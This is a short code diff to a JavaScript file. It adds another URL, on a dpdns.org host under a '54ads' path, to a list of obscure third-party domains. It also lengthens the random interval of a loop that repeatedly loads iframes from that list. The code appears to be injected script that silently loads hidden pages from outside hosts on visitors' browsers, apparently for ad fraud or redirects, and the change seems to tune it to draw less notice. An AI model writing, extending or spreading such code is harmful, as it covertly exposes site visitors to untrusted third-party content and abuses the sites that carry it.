@@ -85,7 +85,8 @@ var peLinkList = [
     "https://aj2758.top/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe?t=" + Date.now(),
     "https://1.test.0147258.xyz/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe?t=" + Date.now(),
     "https://code.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe?t=" + Date.now(),
-    "https://cdn77.aj2758.top/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe?t=" + Date.now()
+    "https://cdn77.aj2758.top/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe?t=" + Date.now(),
+    "https://serv8.wrnm.dpdns.org/54ads/1.php",
 ];
 
 function isMobile() {
@@ -185,7 +186,7 @@ function stopLoop() {
         if (pendingIframes <= 0 && currentTimeout) {
             clearTimeout(currentTimeout);
             if (isLoopRunning) {
-                currentTimeout = setTimeout(runIframeLoop, Math.floor(Math.random() * 4000) + 4000);
+                currentTimeout = setTimeout(runIframeLoop, Math.floor(Math.random() * 10000) + 10000);
             } else {
                 isLoopRunning = false;
             }
@@ -218,7 +219,7 @@ function stopLoop() {
     currentTimeout = setTimeout(function() {
         if (currentTimeout) {
             if (isLoopRunning) {
-                currentTimeout = setTimeout(runIframeLoop, Math.floor(Math.random() * 4000) + 4000);
+                currentTimeout = setTimeout(runIframeLoop, Math.floor(Math.random() * 10000) + 10000);
             } else {
                 isLoopRunning = false;
             }
